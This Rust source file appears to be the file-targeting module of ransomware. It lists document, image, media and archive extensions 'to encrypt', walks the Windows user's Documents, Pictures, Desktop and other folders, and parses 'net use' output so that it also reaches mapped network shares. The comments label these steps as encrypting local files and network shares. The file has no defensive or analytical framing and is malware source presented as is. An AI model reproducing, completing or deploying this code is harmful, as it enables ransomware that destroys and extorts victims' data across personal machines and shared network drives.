use walkdir::WalkDir;
use std::path::{Path, PathBuf};
use std::process::Command;

static EXTENSIONS_TO_ENCRYPT: [&str; 15] = [
    "doc", "docx", "xls", "xlsx", "ppt", "pptx",
    "pdf", "jpg", "jpeg", "png", "txt",
    "mp3", "mp4", "zip", "rar"
];

static DIRECTORIES_TO_TARGET: [&str; 6] = [
    "Documents", "Pictures", "Desktop", "Downloads", "Music", "Videos"
];

pub fn get_target_files() -> Vec<PathBuf> {
    let mut files = Vec::new();

    let user_profile = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Public".to_string());

    // Encrypt local files
    for dir in DIRECTORIES_TO_TARGET.iter() {
        let path = Path::new(&user_profile).join(dir);
        if path.exists() {
            for entry in WalkDir::new(&path).follow_links(true).into_iter().filter_map(|e| e.ok()) {
                let path = entry.path().to_path_buf();
                if path.is_file() {
                    if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                        if EXTENSIONS_TO_ENCRYPT.contains(&ext.to_ascii_lowercase().as_str()) {
                            files.push(path);
                        }
                    }
                }
            }
        }
    }

    // Encrypt network shares
    if cfg!(windows) {
        if let Ok(output) = Command::new("net")
            .args(&["use"])
            .output() {
            let net_use_output = String::from_utf8_lossy(&output.stdout);
        for line in net_use_output.lines() {
            if line.starts_with("OK") && line.contains("\\\\") {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 3 {
                    let share_path = parts[2];
                    let path = Path::new(share_path);
                    if path.exists() {
                        for entry in WalkDir::new(path).follow_links(true).into_iter().filter_map(|e| e.ok()) {
                            let path = entry.path().to_path_buf();
                            if path.is_file() {
                                if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                                    if EXTENSIONS_TO_ENCRYPT.contains(&ext.to_ascii_lowercase().as_str()) {
                                        files.push(path);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        }
    }

    files
}